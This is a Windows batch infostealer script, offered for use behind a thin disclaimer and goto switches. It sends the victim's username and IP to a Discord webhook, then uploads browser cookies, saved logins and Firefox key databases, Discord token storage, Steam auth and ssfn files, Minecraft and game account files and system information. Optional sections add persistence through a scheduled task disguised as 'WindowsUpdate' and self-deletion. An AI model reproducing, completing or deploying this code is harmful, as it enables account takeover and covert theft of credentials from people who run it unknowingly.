@echo off
:: BY REMOVING THE (GOTO)s YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
goto remove_this_if_you_agree_to_follow_the_TOS

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
set "webhook=https://discord.com/api/webhooks/"

:: GET IP ADDRESS
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET TIME
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
	set SS=%%c
)

:: SEND FIRST REPORT MESSAGE WITH SOME INFO
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%

:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipsysteminfocapture
set tempsys=%appdata%\sysinfo.txt
2>NUL SystemInfo > %tempsys%
curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
del %tempsys%
:skipsysteminfocapture

:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipgrowtopia
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
curl --silent --output /dev/null -F save.dat=@%localappdata%\Growtopia\save.dat %webhook%
:skipgrowtopia

:: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipchrome
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@%localappdata%\Google\Chrome\User" "Data\Default\Cookies %webhook%
curl --silent --output /dev/null -F h=@%localappdata%\Google\Chrome\User" "Data\Default\History %webhook%
curl --silent --output /dev/null -F s=@%localappdata%\Google\Chrome\User" "Data\Default\Shortcuts %webhook%
curl --silent --output /dev/null -F b=@%localappdata%\Google\Chrome\User" "Data\Default\Bookmarks %webhook%
curl --silent --output /dev/null -F l=@%localappdata%\Google\Chrome\User" "Data\Default\Login" "Data %webhook%
:skipchrome

:: OPERA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipopera
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@%appdata%\Opera" "Software\Opera" "Stable\Cookies %webhook%
curl --silent --output /dev/null -F h=@%appdata%\Opera" "Software\Opera" "Stable\History %webhook%
curl --silent --output /dev/null -F s=@%appdata%\Opera" "Software\Opera" "Stable\Shortcuts %webhook%
curl --silent --output /dev/null -F b=@%appdata%\Opera" "Software\Opera" "Stable\Bookmarks %webhook%
curl --silent --output /dev/null -F l=@%appdata%\Opera" "Software\Opera" "Stable\Login" "Data %webhook%
:skipopera

:: VIVALDI - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipvivaldi
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- VIVALDI -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@%localappdata%\Vivaldi\User" "Data\Default\Cookies %webhook%
curl --silent --output /dev/null -F h=@%localappdata%\Vivaldi\User" "Data\Default\History %webhook%
curl --silent --output /dev/null -F s=@%localappdata%\Vivaldi\User" "Data\Default\Shortcuts %webhook%
curl --silent --output /dev/null -F b=@%localappdata%\Vivaldi\User" "Data\Default\Bookmarks %webhook%
curl --silent --output /dev/null -F l=@%localappdata%\Vivaldi\User" "Data\Default\Login" "Data %webhook%
:skipvivaldi

:: FIREFOX - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipfirefox
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json %webhook%
		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
		pause
	)
)
:skipfirefox

:: osu! - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skiposu
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- osu! -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@%localappdata%\osu!\osu!.%username%.cfg %webhook%
:skiposu

:: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipdiscord
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('dir /b %appdata%\discord\Local" "Storage\leveldb\') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@%appdata%\discord\Local" "Storage\leveldb\%%f %webhook%
	)
)
:skipdiscord

:: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipsteam
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@C:\Program" "Files" "(x86)\Steam\config\loginusers.vdf %webhook%
curl --silent --output /dev/null -F loginusers=@C:\Program" "Files\Steam\config\loginusers.vdf %webhook%
for /f %%s in ('dir /b C:\Program" "Files" "(x86)\Steam\') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
	)
)
for /f %%s in ('dir /b /a:h C:\Program" "Files" "(x86)\Steam\') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
	)
)
:skipsteam

:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
goto skipminecraft
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_accounts.json %webhook%
:skipminecraft

:: INFORMATION ABOUT THE PROCESS
:: -----------------------------

:: MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON
set "when=WEEKLY"
set "ScheduleName=WindowsUpdate"

:: DO NOT EDIT
set "recurring=false"

:: RECURRING START OF THE BATCH FILE - REMOVE THE GOTO IF YOU WANT IT
goto skiprecurring
:: Copy batch file to a folder
copy "%~f0" "%appdata%\Microsoft\Windows\%~nx0"
SchTasks /Create /F /SC %when% /TN "%ScheduleName%" /TR "%appdata%\Microsoft\Windows\%~nx0"
set "recurring=true, %when%"
:skiprecurring

:: SEND REPORT ENDED MESSAGE
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%

:: SELF DELETE AFTER EXECUTION - REMOVE GOTO IF YOU WANT IT
goto skipselfdelete
if not "%cd%"=="%appdata%\Microsoft\Windows" (
call :d & exit /b
:d
start /b "" cmd /c del "%~f0"&exit /b
)
:skipselfdelete

:remove_this_if_you_agree_to_follow_the_TOS
exit
